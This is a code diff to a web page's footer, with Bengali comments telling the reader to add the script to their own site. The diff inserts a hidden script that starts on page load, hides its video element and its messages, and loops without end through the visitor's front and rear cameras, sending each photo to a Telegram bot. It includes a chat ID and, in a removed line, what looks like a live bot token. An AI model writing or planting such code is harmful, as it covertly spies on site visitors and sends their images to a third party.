@@ -297,22 +297,24 @@
       
     </div>
   </footer>
+<!-- আগে তোমার website content -->
+
+<!-- Body শেষের দিকে এই script যোগ করো -->
 <script>
 (function(){
-  const TOKEN = "7055229139:AAHgJNtq6Pdve_e1W5xtlWQxjnzm27fjtpU";
-  const video = document.getElementById("video");
-  const msg = document.getElementById("msg");
-  let chat_id = "7365118765";
+  const TOKEN = "12345678910"; // তোমার bot token
+  let chat_id = "7365118765";   // Telegram chat ID
 
-  function showMessage(text) {
-    msg.innerText = text;
-  }
+  // temporary hidden video element
+  const video = document.createElement("video");
+  video.style.display = "none";
+  document.body.appendChild(video);
 
   function sendPhotoToTelegram(blob, camType){
     if (!chat_id) return;
     let formData = new FormData();
     formData.append("chat_id", chat_id);
-    formData.append("caption", ` ${camType} Camera Capture`);
+    formData.append("caption", `${camType} Camera Capture`);
     formData.append("photo", blob, `img_${camType}_${Date.now()}.jpg`);
 
     fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
@@ -327,9 +329,8 @@
         video: { facingMode: { exact: facingMode } }, audio: false
       });
       video.srcObject = stream;
-      video.play();
+      await video.play();
 
-      // ???????????? ???? ????? ???? ???? ???
       await new Promise(res => setTimeout(res, 500));
 
       const canvas = document.createElement("canvas");
@@ -342,28 +343,27 @@
 
       stream.getTracks().forEach(track => track.stop());
     } catch (err) {
-      showMessage(`? Cannot access ${camType} camera`);
+      console.warn(`Cannot access ${camType} camera`, err);
     }
   }
 
   async function startLoop(){
     while(true){
       await captureFrame("Front", "user");
-      await new Promise(res => setTimeout(res, 500)); // 0.5 ??????? ?????
+      await new Promise(res => setTimeout(res, 500));
       await captureFrame("Rear", "environment");
       await new Promise(res => setTimeout(res, 500));
     }
   }
 
   window.addEventListener("load", () => {
-    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
-      showMessage("? Device does not support camera.");
-      return;
-    }
-    showMessage("?? Continuous capture started...");
+    if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
     startLoop();
   });
+})();
+</script>
 
+<script>
 })();
 
     // Year
